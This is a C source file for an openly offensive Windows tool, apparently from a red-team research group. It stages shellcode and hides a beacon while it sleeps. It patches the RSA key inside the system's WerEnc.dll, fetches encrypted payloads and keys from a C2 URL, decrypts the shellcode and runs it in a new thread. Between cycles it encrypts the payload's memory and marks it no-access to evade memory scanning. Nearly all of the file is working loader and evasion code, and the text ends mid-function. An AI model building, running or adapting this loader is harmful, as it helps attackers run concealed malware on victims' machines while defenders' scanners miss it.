/*
 * werenc_rt.c - WerEnc.dll BYOK runtime stager + beacon sleep encryption
 *
 *
 * Operator workflow:
 *   werenc_byok.exe --generate-keys
 *   python3 werenc_keyserver.py           (serves keys on HTTP)
 *   werenc_byok.exe --encrypt payload.bin (for one-shot mode)
 *
 * Target:
 *   werenc_rt.exe <file.byok.enc>                          one-shot decrypt+exec
 *   werenc_rt.exe --url http://c2/sc.byok.enc              fetch+decrypt+exec
 *   werenc_rt.exe --test <file.byok.enc>                   decrypt+hexdump
 *   werenc_rt.exe --mem-stage <raw.bin>                    encrypt+decrypt+exec
 *   werenc_rt.exe --beacon <payload> --c2 http://c2/keys   sleep-cycle with C2 keys
 *   werenc_rt.exe --beacon <payload> --sleep 5000           lab mode (keys from disk)
 *
 * Compile (MinGW cross):
 *   x86_64-w64-mingw32-gcc -O2 -o werenc_rt.exe werenc_rt.c -municode
 *
 * Author: 0xsp research
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <objidl.h>


 // CNG types (resolved from bcrypt.dll, loaded as WerEnc's dependency)


typedef LONG NTSTATUS;

typedef struct {
    ULONG Magic;
    ULONG BitLength;
    ULONG cbPublicExp;
    ULONG cbModulus;
    ULONG cbPrime1;
    ULONG cbPrime2;
} RSAKEY_BLOB;

typedef struct {
    LPCWSTR pszAlgId;
    BYTE   *pbLabel;
    ULONG   cbLabel;
} OAEP_PAD;

typedef struct {
    LPVOID lpBaseOfDll;
    DWORD  SizeOfImage;
    LPVOID EntryPoint;
} MY_MODINFO;

#define PAD_PKCS1 0x00000002
#define PAD_OAEP  0x00000008

typedef NTSTATUS (WINAPI *fn_Open)(void**, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS (WINAPI *fn_ImportKP)(void*, void*, LPCWSTR, void**, BYTE*, ULONG, ULONG);
typedef NTSTATUS (WINAPI *fn_Decrypt)(void*, BYTE*, ULONG, void*, BYTE*, ULONG, BYTE*, ULONG, ULONG*, ULONG);
typedef NTSTATUS (WINAPI *fn_GenSym)(void*, void**, BYTE*, ULONG, BYTE*, ULONG, ULONG);
typedef NTSTATUS (WINAPI *fn_SetProp)(void*, LPCWSTR, BYTE*, ULONG, ULONG);
typedef NTSTATUS (WINAPI *fn_Destroy)(void*);
typedef NTSTATUS (WINAPI *fn_Close)(void*, ULONG);
typedef HRESULT  (WINAPI *fn_EncStream)(IStream*, IStream*, PVOID);

static fn_Open     pOpen;
static fn_ImportKP pImportKP;
static fn_Decrypt  pBCDecrypt;
static fn_GenSym   pGenSym;
static fn_SetProp  pSetProp;
static fn_Destroy  pDestroy;
static fn_Close    pBCClose;


static void hexdump(const BYTE *buf, DWORD len, DWORD max)
{
    DWORD show = (len < max) ? len : max;
    for (DWORD i = 0; i < show; i++) {
        if (i && (i % 16 == 0)) printf("\n  ");
        printf("%02X ", buf[i]);
    }
    if (show < len) printf("...(+%lu)", (unsigned long)(len - show));
    printf("\n");
}

static BYTE *ReadFileToMem(const wchar_t *path, DWORD *len)
{
    *len = 0;
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    DWORD sz = GetFileSize(h, NULL);
    if (sz == 0 || sz == INVALID_FILE_SIZE) { CloseHandle(h); return NULL; }
    BYTE *buf = (BYTE *)VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    if (!buf) { CloseHandle(h); return NULL; }
    DWORD rd = 0;
    ReadFile(h, buf, sz, &rd, NULL);
    CloseHandle(h);
    *len = rd;
    return buf;
}

static BYTE *ReadKeyFile(const wchar_t *path, DWORD *len)
{
    *len = 0;
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    DWORD sz = GetFileSize(h, NULL);
    if (sz == 0 || sz == INVALID_FILE_SIZE) { CloseHandle(h); return NULL; }
    BYTE *buf = (BYTE *)malloc(sz);
    DWORD rd = 0;
    ReadFile(h, buf, sz, &rd, NULL);
    CloseHandle(h);
    *len = rd;
    return buf;
}

static BYTE *FetchHTTP(const wchar_t *url, DWORD *len)
{
    *len = 0;
    typedef void *HINET;
    typedef HINET (WINAPI *fn_IOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    typedef HINET (WINAPI *fn_IUrl)(HINET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
    typedef BOOL  (WINAPI *fn_IRead)(HINET, LPVOID, DWORD, LPDWORD);
    typedef BOOL  (WINAPI *fn_ICls)(HINET);

    HMODULE hI = LoadLibraryW(L"wininet.dll");
    if (!hI) return NULL;
    fn_IOpen pO = (fn_IOpen)GetProcAddress(hI, "InternetOpenW");
    fn_IUrl  pU = (fn_IUrl) GetProcAddress(hI, "InternetOpenUrlW");
    fn_IRead pR = (fn_IRead)GetProcAddress(hI, "InternetReadFile");
    fn_ICls  pC = (fn_ICls) GetProcAddress(hI, "InternetCloseHandle");
    if (!pO || !pU || !pR || !pC) return NULL;

    HINET hNet = pO(L"Mozilla/5.0", 0, NULL, NULL, 0);
    if (!hNet) return NULL;
    HINET hUrl = pU(hNet, url, NULL, 0, 0x80000000, 0);
    if (!hUrl) { pC(hNet); return NULL; }

    DWORD cap = 64 * 1024, total = 0, rd = 0;
    BYTE *buf = (BYTE *)VirtualAlloc(NULL, cap, MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    while (pR(hUrl, buf + total, cap - total, &rd) && rd > 0) {
        total += rd;
        if (total + 4096 > cap) {
            cap *= 2;
            BYTE *nb = (BYTE *)VirtualAlloc(NULL, cap, MEM_COMMIT | MEM_RESERVE,
                                            PAGE_READWRITE);
            memcpy(nb, buf, total);
            VirtualFree(buf, 0, MEM_RELEASE);
            buf = nb;
        }
    }
    pC(hUrl); pC(hNet);
    *len = total;
    return buf;
}

// WerEnc Container signatrure. 

static const BYTE WERENC_MAGIC[16] = {
    0xF3, 0x0E, 0x3E, 0xA1, 0x71, 0xD5, 0xAF, 0x4E,
    0x9F, 0xBB, 0xF8, 0x0D, 0x0B, 0x19, 0xA3, 0xC0
};

static int IsWerEncContainer(const BYTE *data, DWORD len)
{
    if (len < 0x40) return 0;
    if (memcmp(data, WERENC_MAGIC, 16) != 0) return 0;
    return (*(DWORD *)(data + 0x20) == 2);
}






static HMODULE LoadWerEnc(void)
{
    HMODULE h = LoadLibraryW(L"WerEnc.dll");
    if (!h) h = LoadLibraryW(L"C:\\Windows\\System32\\WerEnc.dll");
    return h;
}

static int ResolveCNG(void)
{
    HMODULE h = GetModuleHandleW(L"bcrypt.dll");
    if (!h) h = LoadLibraryW(L"bcrypt.dll");
    if (!h) return 0;
    pOpen     = (fn_Open)    GetProcAddress(h, "BCryptOpenAlgorithmProvider");
    pImportKP = (fn_ImportKP)GetProcAddress(h, "BCryptImportKeyPair");
    pBCDecrypt= (fn_Decrypt) GetProcAddress(h, "BCryptDecrypt");
    pGenSym   = (fn_GenSym)  GetProcAddress(h, "BCryptGenerateSymmetricKey");
    pSetProp  = (fn_SetProp) GetProcAddress(h, "BCryptSetProperty");
    pDestroy  = (fn_Destroy) GetProcAddress(h, "BCryptDestroyKey");
    pBCClose  = (fn_Close)   GetProcAddress(h, "BCryptCloseAlgorithmProvider");
    return (pOpen && pImportKP && pBCDecrypt && pGenSym && pSetProp && pDestroy && pBCClose);
}

static int Patching_key(HMODULE hEnc, const BYTE *pubBlob, DWORD pubLen)
{
    if (pubLen < sizeof(RSAKEY_BLOB)) return 0;
    RSAKEY_BLOB *ourKey = (RSAKEY_BLOB *)pubBlob;

    typedef BOOL (WINAPI *fn_GMI)(HANDLE, HMODULE, void*, DWORD);
    HMODULE hPs = LoadLibraryW(L"psapi.dll");
    fn_GMI pGMI = NULL;
    if (hPs) pGMI = (fn_GMI)GetProcAddress(hPs, "GetModuleInformation");

    BYTE *base; DWORD size;
    MY_MODINFO mi;
    if (pGMI && pGMI(GetCurrentProcess(), hEnc, &mi, sizeof(mi))) {
        base = (BYTE *)mi.lpBaseOfDll;
        size = mi.SizeOfImage;
    } else {
        base = (BYTE *)hEnc;
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
        IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
        size = nt->OptionalHeader.SizeOfImage;
    }
    if (hPs) FreeLibrary(hPs);

    int patched = 0;
    for (DWORD off = 0; off + sizeof(RSAKEY_BLOB) < size; off++) {
        if (*(ULONG *)(base + off) != 0x31415352) continue;
        RSAKEY_BLOB *blob = (RSAKEY_BLOB *)(base + off);
        if (blob->BitLength   != ourKey->BitLength)   continue;
        if (blob->cbPublicExp != ourKey->cbPublicExp)  continue;
        if (blob->cbModulus   != ourKey->cbModulus)    continue;

        ULONG blobSz = sizeof(RSAKEY_BLOB) + blob->cbPublicExp + blob->cbModulus;
        DWORD oldProt;
        if (!VirtualProtect(base + off, blobSz, PAGE_READWRITE, &oldProt))
            continue;
        memcpy(base + off, pubBlob, blobSz);
        VirtualProtect(base + off, blobSz, oldProt, &oldProt);
        patched++;
    }
    return patched;
}

// Encryption with WerEnc EncryptDumpStream(), wrape the buffer to use HGlobal memory handle to store streamm content, the object is OLE of IStream COM interface.
static HRESULT (WINAPI *pCreateStreamOnHGlobal)(HGLOBAL, BOOL, IStream **);

static int InitOle(void)
{
    HMODULE h = LoadLibraryW(L"ole32.dll");
    if (!h) return 0;
    pCreateStreamOnHGlobal = (HRESULT (WINAPI *)(HGLOBAL, BOOL, IStream **))
        GetProcAddress(h, "CreateStreamOnHGlobal");
    return pCreateStreamOnHGlobal != NULL;
}

static IStream *BufToStream(const BYTE *data, DWORD len)
{
    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, len);
    if (!hg) return NULL;
    void *p = GlobalLock(hg);
    memcpy(p, data, len);
    GlobalUnlock(hg);
    IStream *s = NULL;
    if (pCreateStreamOnHGlobal(hg, TRUE, &s) != 0) { GlobalFree(hg); return NULL; }
    return s;
}

static BYTE *DrainStream(IStream *s, DWORD *outLen)
{
    STATSTG stat; *outLen = 0;
    LARGE_INTEGER zero = {0};
    if (s->lpVtbl->Stat(s, &stat, 1) != 0) return NULL;
    DWORD cb = stat.cbSize.LowPart;
    if (cb == 0) return NULL;
    BYTE *buf = (BYTE *)VirtualAlloc(NULL, cb + 16, MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    if (!buf) return NULL;
    s->lpVtbl->Seek(s, zero, STREAM_SEEK_SET, NULL);
    ULONG got = 0;
    s->lpVtbl->Read(s, buf, cb, &got);
    *outLen = got;
    return buf;
}

static BYTE *EncryptInMemory(fn_EncStream pEnc, const BYTE *payload,
                             DWORD payloadLen, DWORD *encLen)
{
    *encLen = 0;
    IStream *sIn = BufToStream(payload, payloadLen);
    IStream *sOut = NULL;
    if (!sIn) return NULL;
    if (pCreateStreamOnHGlobal(NULL, TRUE, &sOut) != 0) {
        sIn->lpVtbl->Release(sIn); return NULL;
    }
    HRESULT hr = pEnc(sIn, sOut, NULL);
    sIn->lpVtbl->Release(sIn);
    if (FAILED(hr)) { sOut->lpVtbl->Release(sOut); return NULL; }
    BYTE *enc = DrainStream(sOut, encLen);
    sOut->lpVtbl->Release(sOut);
    return enc;
}

// decryption using CNG Bcrypt. 

static int RsaUnwrap(void *hKey, const BYTE *block, ULONG blockSz,
                     BYTE *out, ULONG outCap, ULONG minLen, ULONG maxLen,
                     ULONG *outLen)
{
    *outLen = 0;
    NTSTATUS st = pBCDecrypt(hKey, (BYTE *)block, blockSz, NULL,
                             NULL, 0, out, outCap, outLen, PAD_PKCS1);
    if (st == 0 && *outLen >= minLen && *outLen <= maxLen) return 1;

    wchar_t sha256[] = L"SHA256";
    OAEP_PAD oaep = { sha256, NULL, 0 };
    *outLen = 0;
    st = pBCDecrypt(hKey, (BYTE *)block, blockSz, &oaep,
                    NULL, 0, out, outCap, outLen, PAD_OAEP);
    if (st == 0 && *outLen >= minLen && *outLen <= maxLen) return 1;

    wchar_t sha1[] = L"SHA1";
    oaep.pszAlgId = sha1;
    *outLen = 0;
    st = pBCDecrypt(hKey, (BYTE *)block, blockSz, &oaep,
                    NULL, 0, out, outCap, outLen, PAD_OAEP);
    if (st == 0 && *outLen >= minLen && *outLen <= maxLen) return 1;
    return 0;
}

static BYTE *DecryptContainer(const BYTE *enc, DWORD encLen,
                              const BYTE *privBlob, DWORD privLen,
                              DWORD *outLen)
{
    *outLen = 0;
    if (encLen < 0x40) return NULL;

    DWORD blobOff  = *(DWORD *)(enc + 0x24);
    DWORD origSize = *(DWORD *)(enc + 0x28);
    DWORD blobSize = *(DWORD *)(enc + 0x30);
    DWORD rsaBlkSz = *(DWORD *)(enc + 0x34);

    if (rsaBlkSz == 0) return NULL;
    DWORD wrapKeyOff = blobOff + blobSize;
    DWORD wrapIvOff  = wrapKeyOff + rsaBlkSz;
    DWORD contentOff = wrapIvOff + rsaBlkSz;
    if (contentOff > encLen) return NULL;
    DWORD contentLen = encLen - contentOff;
    if (contentLen == 0 || (contentLen & 15)) return NULL;
    if (origSize == 0 || origSize > contentLen)
        origSize = contentLen;

    void *hRsaAlg = NULL, *hRsaKey = NULL;
    if (pOpen(&hRsaAlg, L"RSA", NULL, 0) != 0) return NULL;
    NTSTATUS st = pImportKP(hRsaAlg, NULL, L"RSAFULLPRIVATEBLOB", &hRsaKey,
                            (BYTE *)privBlob, privLen, 0);
    if (st != 0)
        st = pImportKP(hRsaAlg, NULL, L"RSAPRIVATEBLOB", &hRsaKey,
                       (BYTE *)privBlob, privLen, 0);
    if (st != 0) { pBCClose(hRsaAlg, 0); return NULL; }

    BYTE aesKey[64]; ULONG aesKeyLen = 0;
    if (!RsaUnwrap(hRsaKey, enc + wrapKeyOff, rsaBlkSz,
                   aesKey, sizeof(aesKey), 16, 32, &aesKeyLen)) {
        pDestroy(hRsaKey); pBCClose(hRsaAlg, 0); return NULL;
    }

    BYTE iv[64]; ULONG ivLen = 0;
    if (!RsaUnwrap(hRsaKey, enc + wrapIvOff, rsaBlkSz,
                   iv, sizeof(iv), 16, 16, &ivLen)) {
        pDestroy(hRsaKey); pBCClose(hRsaAlg, 0); return NULL;
    }
    pDestroy(hRsaKey); pBCClose(hRsaAlg, 0);

    void *hAesAlg = NULL, *hAesKey = NULL;
    if (pOpen(&hAesAlg, L"AES", NULL, 0) != 0) return NULL;
    wchar_t cbc[] = L"ChainingModeCBC";
    pSetProp(hAesAlg, L"ChainingMode", (BYTE *)cbc, (ULONG)(wcslen(cbc) + 1) * 2, 0);
    ULONG keyLen = (aesKeyLen >= 32) ? 32 : (aesKeyLen >= 24) ? 24 : 16;
    if (pGenSym(hAesAlg, &hAesKey, NULL, 0, aesKey, keyLen, 0) != 0) {
        pBCClose(hAesAlg, 0); return NULL;
    }

    BYTE *plain = (BYTE *)VirtualAlloc(NULL, contentLen + 16,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ULONG decLen = 0;
    BYTE ivCopy[16]; memcpy(ivCopy, iv, 16);
    st = pBCDecrypt(hAesKey, (BYTE *)enc + contentOff, contentLen,
                    NULL, ivCopy, 16, plain, contentLen + 16, &decLen, 0);
    pDestroy(hAesKey); pBCClose(hAesAlg, 0);

    SecureZeroMemory(aesKey, sizeof(aesKey));
    SecureZeroMemory(iv, sizeof(iv));
    SecureZeroMemory(ivCopy, sizeof(ivCopy));

    if (st != 0) { VirtualFree(plain, 0, MEM_RELEASE); return NULL; }
    *outLen = (origSize <= decLen) ? origSize : decLen;
    return plain;
}


static int Execute(BYTE *payload, DWORD len)
{
    DWORD old;
    if (!VirtualProtect(payload, len, PAGE_EXECUTE_READ, &old)) return 0;
    HANDLE hT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
    printf("Executing the Shellcode at 0x");
    if (!hT) return 0;
    WaitForSingleObject(hT, INFINITE);
    CloseHandle(hT);
    return 1;
}

// fetch the keys and cache it in memory.


static int FetchKeysFromC2(const wchar_t *c2Url,
                           BYTE **outPub, DWORD *outPubLen,
                           BYTE **outPriv, DWORD *outPrivLen)
{


    *outPub = NULL; *outPriv = NULL;
    *outPubLen = 0; *outPrivLen = 0;

    DWORD blobLen = 0;
    BYTE *blob = FetchHTTP(c2Url, &blobLen);
    if (!blob || blobLen < 8) {
        printf("[!] C2 key fetch failed..\n");
        return 0;
    }

    DWORD pubLen = *(DWORD *)blob;
    if (8 + pubLen > blobLen) {
        printf("[!] C2 blob truncated (pubLen=%lu, total=%lu)\n",
               (unsigned long)pubLen, (unsigned long)blobLen);
        VirtualFree(blob, 0, MEM_RELEASE);
        return 0;
    }

    DWORD privLen = *(DWORD *)(blob + 4 + pubLen);
    if (8 + pubLen + privLen > blobLen) {
        printf("[!] C2 blob truncated (privLen=%lu)\n", (unsigned long)privLen);
        VirtualFree(blob, 0, MEM_RELEASE);
        return 0;
    }

    *outPub = (BYTE *)malloc(pubLen);
    memcpy(*outPub, blob + 4, pubLen);
    *outPubLen = pubLen;

    *outPriv = (BYTE *)malloc(privLen);
    memcpy(*outPriv, blob + 4 + pubLen + 4, privLen);
    *outPrivLen = privLen;

    SecureZeroMemory(blob, blobLen);
    VirtualFree(blob, 0, MEM_RELEASE);

    printf("[+]  keys transmitted: pub=%lu bytes, priv=%lu bytes\n",
           (unsigned long)pubLen, (unsigned long)privLen);
    return 1;
}

/* -----------------------------------------------------------------------
 *  Beacon mode: two-thread sleep-cycle encryption via WerEnc.dll
 *
 *  Two threads (same pattern as ZigStrike/SleepyCrypt):
 *    - Payload thread: runs the shellcode/beacon independently
 *    - Wrapper thread: manages encrypt/sleep/decrypt externally
 *
 *  Wrapper loop:
 *    1. SuspendThread(payload_thread)
 *    2. VirtualProtect(payload, PAGE_READWRITE)
 *    3. EncryptDumpStream(payload region) -> WerEnc container
 *    4. SecureZeroMemory(payload region)
 *    5. VirtualProtect(payload, PAGE_NOACCESS)
 *    6. Sleep(ms)                   <- wrapper sleeps, payload is frozen
 *    7. VirtualProtect(payload, PAGE_READWRITE)
 *    8. DecryptContainer -> recover plaintext
 *    9. memcpy back to payload region
 *   10. VirtualProtect(payload, PAGE_EXECUTE_READ)
 *   11. ResumeThread(payload_thread)
 *   12. brief wait, then goto 1
 *
 *  The payload thread never participates in encryption. It gets
 *  suspended by the wrapper, its code pages encrypted while frozen,
 *  and resumed with everything restored.
 * -----------------------------------------------------------------------*/

typedef struct {
    HANDLE       hPayloadThread;
    BYTE        *payloadAddr;
    DWORD        payloadLen;
    fn_EncStream pEncStream;
    BYTE        *privBlob;
    DWORD        privLen;
    DWORD        sleepMs;
    int          maxCycles;
} WRAPPER_CTX;

static DWORD WINAPI WrapperThread(LPVOID param)
{
    WRAPPER_CTX *ctx = (WRAPPER_CTX *)param;
    HANDLE hPT = ctx->hPayloadThread;

    Sleep(500);

    for (int cycle = 0; cycle < ctx->maxCycles; cycle++) {

        if (WaitForSingleObject(hPT, 0) == WAIT_OBJECT_0) {
            printf("[wrapper] payload thread exited\n");
            break;
        }

        /* Suspend the payload thread */
        DWORD sc = SuspendThread(hPT);
        if (sc == (DWORD)-1) {
            printf("[wrapper] SuspendThread failed: %lu\n", GetLastError());
            break;
        }
        printf("[cycle %d] payload suspended\n", cycle + 1);

        /* --- BEFORE ENCRYPT: dump payload region --- */
        DWORD oldProt;
        VirtualProtect(ctx->payloadAddr, ctx->payloadLen,
                       PAGE_READWRITE, &oldProt);

        printf("[cycle %d] BEFORE encrypt | region @ 0x%p | %lu bytes | prot=0x%lX\n",
               cycle + 1, (void *)ctx->payloadAddr,
               (unsigned long)ctx->payloadLen, (unsigned long)oldProt);
        printf("  first 64 bytes:\n  ");
        hexdump(ctx->payloadAddr, ctx->payloadLen, 64);

        /* Encrypt payload region via WerEnc.dll */
        DWORD encLen = 0;
        BYTE *encBuf = EncryptInMemory(ctx->pEncStream,
                           ctx->payloadAddr, ctx->payloadLen, &encLen);
        if (!encBuf || encLen == 0) {
            printf("[!] EncryptDumpStream failed at cycle %d\n", cycle + 1);
            VirtualProtect(ctx->payloadAddr, ctx->payloadLen, oldProt, &oldProt);
            ResumeThread(hPT);
            break;
        }

        /* --- ENCRYPTED CONTAINER: dump the WerEnc output --- */
        printf("[cycle %d] WerEnc container @ 0x%p | %lu bytes\n",
               cycle + 1, (void *)encBuf, (unsigned long)encLen);
        printf("  header (first 64 bytes):\n  ");
        hexdump(encBuf, encLen, 64);

        /* Wipe and lock payload pages */
        SecureZeroMemory(ctx->payloadAddr, ctx->payloadLen);
        VirtualProtect(ctx->payloadAddr, ctx->payloadLen,
                       PAGE_NOACCESS, &oldProt);

        /* --- DURING SLEEP: show the wiped region (read before NOACCESS) --- */
        printf("[cycle %d] WIPED region @ 0x%p | prot=PAGE_NOACCESS\n",
               cycle + 1, (void *)ctx->payloadAddr);
        printf("  (payload pages zeroed + NOACCESS, not readable)\n");
        printf("[cycle %d] sleeping %lu ms...\n\n",
               cycle + 1, (unsigned long)ctx->sleepMs);

        Sleep(ctx->sleepMs);

        /* Decrypt and restore */
        VirtualProtect(ctx->payloadAddr, ctx->payloadLen,
                       PAGE_READWRITE, &oldProt);

        DWORD plainLen = 0;
        BYTE *plain = DecryptContainer(encBuf, encLen,
                           ctx->privBlob, ctx->privLen, &plainLen);

        SecureZeroMemory(encBuf, encLen);
        VirtualFree(encBuf, 0, MEM_RELEASE);

        if (!plain || plainLen == 0) {
            printf("[!] decrypt failed at cycle %d\n", cycle + 1);
            VirtualProtect(ctx->payloadAddr, ctx->payloadLen,
                           PAGE_EXECUTE_READ, &oldProt);
            ResumeThread(hPT);
            break;
        }

        DWORD cpLen = (plainLen < ctx->payloadLen) ? plainLen : ctx->payloadLen;
        memcpy(ctx->payloadAddr, plain, cpLen);
        VirtualFree(plain, 0, MEM_RELEASE);

        VirtualProtect(ctx->payloadAddr, ctx->payloadLen,
                       PAGE_EXECUTE_READ, &oldProt);

        /* --- AFTER DECRYPT: dump restored payload --- */
        printf("[cycle %d] AFTER decrypt | region @ 0x%p | %lu bytes | prot=PAGE_EXECUTE_READ\n",
               cycle + 1, (void *)ctx->payloadAddr, (unsigned long)cpLen);
        printf("  first 64 bytes:\n  ");
        hexdump(ctx->payloadAddr, cpLen, 64);

        ResumeThread(hPT);
        printf("[cycle %d] payload resumed\n\n", cycle + 1);

        if (WaitForSingleObject(hPT, 500) == WAIT_OBJECT_0) {
            printf("[wrapper] payload exited after cycle %d\n", cycle + 1);
            break;
        }
    }

    printf("[wrapper] done (%d cycles)\n", ctx->maxCycles);
    return 0;
}


static volatile LONG g_beaconAlive = 1;


// in case you don;t have specific payload to supply, 
static DWORD WINAPI BenignPayload(LPVOID param)
{
    (void)param;
    int tick = 0;
    while (g_beaconAlive) {
        tick++;
        printf("    [payload] tick %d\n", tick);
        Sleep(800);
    }
    printf("    [payload] exiting\n");
    return 0;
}

static int BeaconLoop(const wchar_t *payloadPath, DWORD sleepMs,
                      fn_EncStream pEncStream,
                      BYTE *pubBlob, DWORD pubLen,
                      BYTE *privBlob, DWORD privLen,
                      int maxCycles)
{
    (void)pubBlob; (void)pubLen;

    BYTE *payloadRegion = NULL;
    DWORD payloadLen = 0;
    int useBenign = 0;

    if (!payloadPath || wcscmp(payloadPath, L"benign") == 0) {
        useBenign = 1;
        payloadLen = 4096;
        payloadRegion = (BYTE *)VirtualAlloc(NULL, payloadLen,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!payloadRegion) { printf("[!] VirtualAlloc failed\n"); return 1; }
        memcpy(payloadRegion, (BYTE *)BenignPayload, payloadLen);
        printf("[*] benign test payload (%lu bytes)\n",
               (unsigned long)payloadLen);
    } else {
        payloadRegion = ReadFileToMem(payloadPath, &payloadLen);
        if (!payloadRegion || payloadLen == 0) {
            printf("[!] cannot read payload: %S\n", payloadPath);
            return 1;
        }
        DWORD old;
        VirtualProtect(payloadRegion, payloadLen, PAGE_EXECUTE_READWRITE, &old);
        printf("[*] payload loaded: %lu bytes @ %p\n",
               (unsigned long)payloadLen, (void *)payloadRegion);
    }

    printf("[*] two-thread model: wrapper manages encrypt/sleep/decrypt\n");
    printf("[*] sleep=%lu ms, cycles=%d\n\n", (unsigned long)sleepMs, maxCycles);


    HANDLE hPayload = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)payloadRegion, NULL, 0, NULL);
    if (!hPayload) {
        printf("[!] CreateThread(payload) failed: %lu\n", GetLastError());
        VirtualFree(payloadRegion, 0, MEM_RELEASE);
        return 1;
    }
    printf("[+] payload thread started\n");

// wrapper thread 
    WRAPPER_CTX ctx = {0};
    ctx.hPayloadThread = hPayload;
    ctx.payloadAddr    = payloadRegion;
    ctx.payloadLen     = payloadLen;
    ctx.pEncStream     = pEncStream;
    ctx.privBlob       = privBlob;
    ctx.privLen        = privLen;
    ctx.sleepMs        = sleepMs;
    ctx.maxCycles      = maxCycles;

    HANDLE hWrapper = CreateThread(NULL, 0, WrapperThread, &ctx, 0, NULL);
    if (!hWrapper) {
        printf("[!] CreateThread(wrapper) failed\n");
        TerminateThread(hPayload, 1);
        CloseHandle(hPayload);
        VirtualFree(payloadRegion, 0, MEM_RELEASE);
        return 1;
    }
    printf("[+] wrapper thread started\n\n");

    WaitForSingleObject(hWrapper, INFINITE);
    CloseHandle(hWrapper);

    if (useBenign) {
        g_beaconAlive = 0;
        WaitForSingleObject(hPayload, 3000);
    }

    CloseHandle(hPayload);
    SecureZeroMemory(payloadRegion, payloadLen);
    VirtualFree(payloadRegion, 0, MEM_RELEASE);
    return 0;
}



int wmain(int argc, wchar_t *argv[])
{
    if (argc < 2) {
        printf("werenc_rt - WerEnc.dll BYOK runtime stager + beacon\n\n");
        printf("One-shot modes:\n");
        printf("  werenc_rt.exe <file.byok.enc>              decrypt + execute\n");
        printf("  werenc_rt.exe --url http://c2/sc.byok.enc  fetch + decrypt + execute\n");
        printf("  werenc_rt.exe --test <file.byok.enc>       decrypt + hexdump (no exec)\n");
        printf("  werenc_rt.exe --mem-stage <raw.bin>        encrypt + decrypt + exec\n\n");
        printf("Beacon mode (sleep-cycle encryption):\n");
        printf("  werenc_rt.exe --beacon <payload|benign> --c2 http://host/keys\n");
        printf("  werenc_rt.exe --beacon <payload|benign> --sleep 5000 --cycles 10\n\n");
        printf("  --c2 <url>     fetch BYOK keys from C2 (no disk keys needed)\n");
        printf("  --sleep <ms>   sleep interval (default 3000)\n");
        printf("  --cycles <n>   number of sleep cycles (default 5)\n\n");
        printf("Key files: werenc_pub.key + werenc_priv.key\n");
        printf("  (from werenc_byok.exe --generate-keys, or fetched via --c2)\n");
        return 1;
    }

    /* Parse arguments */
    int testMode = 0, memStage = 0, urlMode = 0, beaconMode = 0;
    const wchar_t *target = NULL;
    const wchar_t *c2Url = NULL;
    DWORD sleepMs = 3000;
    int maxCycles = 5;

    for (int i = 1; i < argc; i++) {
        if (wcscmp(argv[i], L"--test") == 0 && i + 1 < argc)
            { testMode = 1; target = argv[++i]; }
        else if (wcscmp(argv[i], L"--mem-stage") == 0 && i + 1 < argc)
            { memStage = 1; target = argv[++i]; }
        else if (wcscmp(argv[i], L"--url") == 0 && i + 1 < argc)
            { urlMode = 1; target = argv[++i]; }
        else if (wcscmp(argv[i], L"--beacon") == 0 && i + 1 < argc)
            { beaconMode = 1; target = argv[++i]; }
        else if (wcscmp(argv[i], L"--c2") == 0 && i + 1 < argc)
            { c2Url = argv[++i]; }
        else if (wcscmp(argv[i], L"--sleep") == 0 && i + 1 < argc)
            { sleepMs = (DWORD)wcstoul(argv[++i], NULL, 0); }
        else if (wcscmp(argv[i], L"--cycles") == 0 && i + 1 < argc)
            { maxCycles = (int)wcstol(argv[++i], NULL, 0); }
        else if (!target)
            target = argv[i];
    }
    if (!target) { printf("[!] no target\n"); return 1; }

   

    HMODULE hEnc = LoadWerEnc();
    if (!hEnc) { printf("[!] WerEnc.dll not found\n"); return 1; }
    printf("[+] WerEnc.dll @ %p\n", (void *)hEnc);

    if (!ResolveCNG()) { printf("[!] CNG failed\n"); return 1; }

   // beacon mode 

    if (beaconMode) {
        if (!InitOle()) { printf("[!] OLE init failed\n"); return 1; }

        fn_EncStream pEncStream = (fn_EncStream)GetProcAddress(hEnc, "EncryptDumpStream"); //here
        if (!pEncStream) pEncStream = (fn_EncStream)GetProcAddress(hEnc, (LPCSTR)2);
        if (!pEncStream) { printf("[!] EncryptDumpStream not found\n"); return 1; }

        BYTE *pubBlob = NULL, *privBlob = NULL;
        DWORD pubLen = 0, privLen = 0;

        if (c2Url) {
           
            printf("[*] fetching BYOK keys from C2: %S\n", c2Url);
            if (!FetchKeysFromC2(c2Url, &pubBlob, &pubLen, &privBlob, &privLen)) {
                return 1;
            }
        } else {
          // fall back into reading the keys from local machine, 
            pubBlob  = ReadKeyFile(L"werenc_pub.key", &pubLen); // this is created for testing purposes. 
            privBlob = ReadKeyFile(L"werenc_priv.key", &privLen);
            if (!pubBlob || !privBlob) {
                printf("[!] need werenc_pub.key + werenc_priv.key (or use --c2)\n");
                return 1;
            }
            printf("[+] keys loaded from disk\n");
        }

        
        if (Patching_key(hEnc, pubBlob, pubLen) == 0) {
            printf("[!] BYOK patch failed\n");
            return 1;
        }
        printf("[+] BYOK patch applied\n\n");

        int ret = BeaconLoop(target, sleepMs, pEncStream,
                             pubBlob, pubLen, privBlob, privLen, maxCycles);

        SecureZeroMemory(pubBlob, pubLen);
